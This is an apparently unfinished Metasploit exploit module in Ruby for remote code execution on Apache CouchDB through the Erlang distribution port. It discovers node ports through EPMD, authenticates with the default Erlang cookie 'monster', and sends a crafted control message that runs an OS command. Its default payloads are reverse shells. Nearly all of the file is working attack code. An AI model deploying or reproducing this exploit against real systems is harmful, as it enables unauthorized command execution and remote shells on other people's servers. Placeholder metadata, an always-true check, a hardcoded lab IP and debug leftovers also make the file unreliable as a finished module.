##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  require 'digest'

  # TARGET = ""
  # EPMD_PORT = 4369 # Default Erlang distributed port
  # COOKIE = "monster" # Default Erlang cookie for CouchDB
  # ERLNAG_PORT = 0
  # EPM_NAME_CMD = "\x00\x01\x6e" # Request for nodes list

  # Some data:
  # NAME_MSG  = "\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA".unpack('c*')
  # CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"
  # CTRL_DATA  = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
  # CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"


  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Apache Couchdb Erlang Rce',
        'Description' => %q(
          Placeholder
        ),
        'Author'      =>
          [
            'Placeholder', # discovery
            'Placeholder'  # module
          ],
        # 'References'  =>
        #   [
        #     [ 'EDB', '' ],
        #     [ 'URL', ''],
        #     [ 'CVE', '']
        #   ],
        'License'        => MSF_LICENSE,
        # 'Platform'       => '',
        'Privileged'     => false ,
        'DefaultOptions' =>
          {
            'PAYLOAD' => 'cmd/unix/reverse_bash'
          },
        'Arch'           => [ ARCH_CMD ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_openssl'
              },
              'Payload' => {
                'Append' => ' & disown'
              }
            }
          ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2000-01-01'
      )
    )

    # Opt::ERLANG_PORT(35703)],
    register_options(
      [
        Opt::RPORT(4369)
      ]
    )
  end

  EPM_NAME_CMD = "\x00\x01\x6e"
  NAME_MSG = "\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
  CHALLENGE_REPLY = "\x00\x15r\x01\x02\x03\x04"
  CTRL_DATA = "\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex"
  COOKIE = 'monster'



  def check
     true
  end

  def compile_cmd(cmd)
    msg = "\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    msg << [cmd.length].pack("S>")
    msg << cmd
    msg << "jw\x04user"
    payload = ("\x70" + CTRL_DATA + msg)
    return ([payload.size].pack("N*") + payload)
  end

  def get_erlang_ports
    # CONNECT TO EDPM:
    erlang_ports = []
    begin
      print_status("Connecting to the EDPM socket...")
      connect(true, {'RHOST'=>datastore['RHOSTS'], 'RPORT'=>datastore['RPORT']})
      # request Erlang nodes
      sock.put(EPM_NAME_CMD)
      sleep 1 # Fix this
      res = sock.get_once
      print_status("res: #{res}")
      fail_with(Failure::UnexpectedReply, "Did not find any Erlang nodes") unless res and res.include?("\x00\x00\x11\x11name")
      print_status("Success")
      disconnect
      res.each_line do |line|
        erlang_ports << line.match(/\s(\d+$)/)[0]
      end
    rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET
      # Ignored
    rescue ::Exception => e
      print_error("#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}")
    end
    erlang_ports
  end

  def exploit
    erlang_ports = get_erlang_ports
    # CONNECT TO ERLANG PORT:
    begin
      print_status("Connecting to Erlang Server...")
      connect(true, {'RHOST'=>'172.16.199.164', 'RPORT'=>erlang_ports[0].to_i})
      print_status("Connected")

      print_status(NAME_MSG)
      sock.put(NAME_MSG)

      sleep 1
      res = sock.get_once(5) # ok message
      challenge =  sock.get_once
      challenge = challenge[9..12].unpack("N*")[0]


      print_status("Unpacked  #{challenge}")

      challenge_reply = "\x00\x15r\x01\x02\x03\x04"
      require 'digest'
      md5 = Digest::MD5.new
      md5.update(COOKIE + challenge.to_s)

      # print_status("Cookie + challenge: " + COOKIE + challenge.to_s)
      # print_status("md5 of Cookie + challenge: " + md5.to_s)

      challenge_reply << [md5.hexdigest].pack('H*')

      # print_status("challenge_reply: #{challenge_reply}")
      # print_status("challenge_reply length: #{challenge_reply.size}")
      sock.put(challenge_reply)
      sleep 1
      challenge_response = sock.get_once

      if challenge_response.empty?
        fail_with(Failure::UnexpectedReply, "Authentication was unsuccessful")
      end

      payload = compile_cmd("id")
      print_status("sending payload... ")
      sock.put(payload)
      # require 'pry'
      # binding.pry
      sleep 1
      res = sock.get_once
      print(res)

    rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e
       print_error("Couldnt connect to Erlang server. Error: #{e.class} #{e} #{e.backtrace} ")
    end

  end
end